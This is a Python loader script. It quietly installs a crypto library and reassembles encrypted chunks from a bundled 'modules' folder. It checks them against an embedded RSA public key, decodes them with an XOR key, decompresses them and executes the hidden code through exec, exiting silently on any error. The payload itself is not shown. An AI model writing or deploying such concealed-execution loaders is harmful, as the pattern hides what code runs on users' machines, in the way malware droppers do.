#!/usr/bin/env python3
import sys
import base64
import zlib
import marshal
import subprocess
from pathlib import Path
from typing import cast

def ensure(pkg: str) -> None:
    try:
        __import__(pkg)
    except Exception:
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", pkg],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        except Exception:
            sys.exit(1)

ensure("cryptography")

from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicKey
from cryptography.hazmat.primitives import hashes, serialization

PUB_KEY: bytes = b'-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsxsxORdhkQSJDVxu2kL7\nGhTEVSQQEnAA6NwhHe5yDwbEcWE+a1y+gsu48U8cMBrDpTcKGiZ7E4pY+UzpYmog\nzSrXZeiJL0WiNkZBbMCiW/rwkpofnbRWrZZ8O2uLZaj7F4PEHhIn0hOgF4tPPPH/\n+GhxvjKaaKY3ARD1MtiySMRZm6dgk4zs1dIkoWArxMiWCVCCOzlrOuZ6+QcSe8vi\nFXKoZfpacgrGLM4gQ5i+OYJ864otMkyUF7PlMUsvElkCA5njTEVSseusH2Sdy15i\nl5vsbJGbngU0HIa4whF+D11Hb1+K8oW0g+Usbj6UvVMDoB4bz3252SO4DJOwkBZa\n1wIDAQAB\n-----END PUBLIC KEY-----\n'
SYM_KEY: bytes = base64.b64decode("ZU50eu61CqoODr3dnbLY3r5b2gTFtUGbOVHT6ggZgcg=")

def xor(data: bytes) -> bytes:
    k = len(SYM_KEY)
    return bytes(b ^ SYM_KEY[i % k] for i, b in enumerate(data))

try:
    base = Path(getattr(sys, "_MEIPASS", Path(__file__).parent))
    mods = base / "modules"
    files = sorted(mods.glob("p*.bin"))
    if not files:
        sys.exit(1)

    blob = b"".join(p.read_bytes() for p in files)
    if b"." not in blob:
        sys.exit(1)

    sig_b64, enc = blob.split(b".", 1)

    pub = cast(RSAPublicKey, serialization.load_pem_public_key(PUB_KEY))
    pub.verify(
        base64.b64decode(sig_b64),
        enc,
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )

    data = zlib.decompress(xor(base64.b64decode(enc)))

    try:
        code = marshal.loads(data)
    except Exception:
        text = data.decode("utf-8")
        if "\x00" in text:
            sys.exit(1)
        code = compile(text, "<run>", "exec")

    exec(code, {"__name__": "__main__"})

except Exception:
    sys.exit(1)
